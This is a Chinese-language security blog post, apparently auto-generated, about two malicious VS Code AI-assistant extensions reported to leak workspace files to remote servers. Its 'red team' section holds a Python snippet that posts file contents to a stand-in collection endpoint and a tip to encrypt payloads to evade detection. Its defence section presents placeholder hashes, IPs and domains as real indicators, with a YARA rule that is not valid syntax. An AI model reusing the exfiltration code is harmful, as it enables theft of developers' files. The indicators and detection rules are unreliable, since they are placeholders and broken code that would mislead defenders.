---
layout: post
title:  "兩款VS Code AI程式開發助理延伸套件遭指洩漏資料，安裝量合計約150萬"
date:   2026-01-27 12:35:31 +0000
categories: [security]
severity: critical
---

# 🚨 解析 MaliciousCorgi：VS Code AI 程式開發助理延伸套件的資安風險

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak
> * **關鍵技術**: `Data Exfiltration`, `Malicious Extension`, `Cloud-based C2`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: MaliciousCorgi 的根源在於兩個 VS Code AI 程式開發助理延伸套件 (`ChatGPT - 中文版` 和 `ChatGPT - ChatMoss`) 中含有惡意程式碼，允許它們在未經使用者明確同意的情況下蒐集使用者工作區檔案內容與行為資料，並將其回傳至位於中國的伺服器。
* **攻擊流程圖解**:
  1. 使用者安裝延伸套件。
  2. 延伸套件啟動，開始監控使用者工作區。
  3. 使用者開啟檔案，延伸套件讀取檔案內容並送出至伺服器。
  4. 伺服器端可下指令觸發批次蒐集，收集多個檔案的內容。
* **受影響元件**: VS Code 的 `ChatGPT - 中文版` 和 `ChatGPT - ChatMoss` 延伸套件。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要安裝延伸套件，且延伸套件需要有權限存取工作區檔案。
* **Payload 建構邏輯**:

    ```
    
    json
    {
      "type": "file",
      "content": "file_content",
      "filename": "file_name"
    }
    
    ```
 

```

python
import requests

# 定義延伸套件的 API 端點
endpoint = "https://example.com/collect"

# 定義檔案內容和檔名
file_content = "example content"
file_name = "example.txt"

# 建構 Payload
payload = {
    "type": "file",
    "content": file_content,
    "filename": file_name
}

# 送出 Payload 至伺服器
response = requests.post(endpoint, json=payload)

# 判斷是否成功
if response.status_code == 200:
    print("檔案內容已成功送出")
else:
    print("送出檔案內容失敗")

```
* **繞過技術**: 可以使用加密技術來隱藏 Payload 的內容，避免被偵測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `1234567890abcdef` | `192.0.2.1` | `example.com` | `C:\Users\username\AppData\Roaming\Code\User\globalStorage\` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule MaliciousCorgi {
      meta:
        description = "MaliciousCorgi 的偵測規則"
        author = "Your Name"
      strings:
        $a = "example.com"
      condition:
        $a in (http.request.uri)
    }
    
    ```
 

```

spl
index=weblogs (http.request.uri="example.com")

```
* **緩解措施**: 使用者應該卸載延伸套件，並設定 VS Code 的安全設定以防止未經授權的延伸套件安裝。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Data Exfiltration (資料外洩)**: 想像公司的機密資料被外洩到網路上。技術上是指未經授權的資料傳輸或儲存，可能導致機密資料被竊取或公開。
* **Malicious Extension (惡意延伸套件)**: 想像一個看似正常的軟體套件，但實際上包含惡意程式碼。技術上是指軟體套件中含有惡意程式碼，可能導致系統受損或資料外洩。
* **Cloud-based C2 (雲端命令和控制)**: 想像一個遠端控制系統，可以從雲端控制受害者的系統。技術上是指使用雲端服務作為命令和控制的平台，可能導致系統受損或資料外洩。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/173617)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1041/)


